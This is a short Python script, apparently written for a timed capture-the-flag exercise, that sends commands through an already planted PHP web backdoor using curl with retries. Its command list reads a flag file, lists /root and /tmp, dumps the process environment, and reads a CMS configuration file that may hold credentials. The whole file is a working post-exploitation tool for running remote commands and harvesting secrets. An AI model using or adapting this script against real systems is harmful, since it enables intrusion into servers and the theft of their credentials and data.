#!/usr/bin/env python3
"""Fast priority probe: read /local.txt FIRST after backdoor plant, then env extras.
Minimizes commands per room since rooms get reaped quickly."""
import subprocess, sys, time

BASE = "http://127.0.0.1:8765/index.php?c="
PRIORITY = [
    "cat%20/local.txt",
    "ls%20-la%20/local.txt%20/root%2F*%20/tmp%2F*",
    "cat%20/proc/self/environ",
    "cat%20/var/www/localhost/htdocs/config/general.php",
    "ls%20-la%20/var/www/localhost/htdocs/files/",
    "cat%20/var/www/localhost/htdocs/files_s/..",
]

def run(cmd, tries=6):
    for i in range(tries):
        p = subprocess.run(
            ["curl", "-s", "--noproxy", "*", "-m", "12", BASE + cmd],
            capture_output=True, text=True)
        out = p.stdout
        if "503" not in out[:40] and out.strip():
            if "<!DOCTYPE" in out:
                return out.split("<!DOCTYPE")[0]
            return out
        time.sleep(3)
    return "(FAILED after retries: %s)" % out[:60]

def main():
    for cmd in PRIORITY:
        print("=== %s ===" % cmd.replace("%20", " ").replace("%2F", "/"))
        print(run(cmd))
        print()

if __name__ == "__main__":
    main()
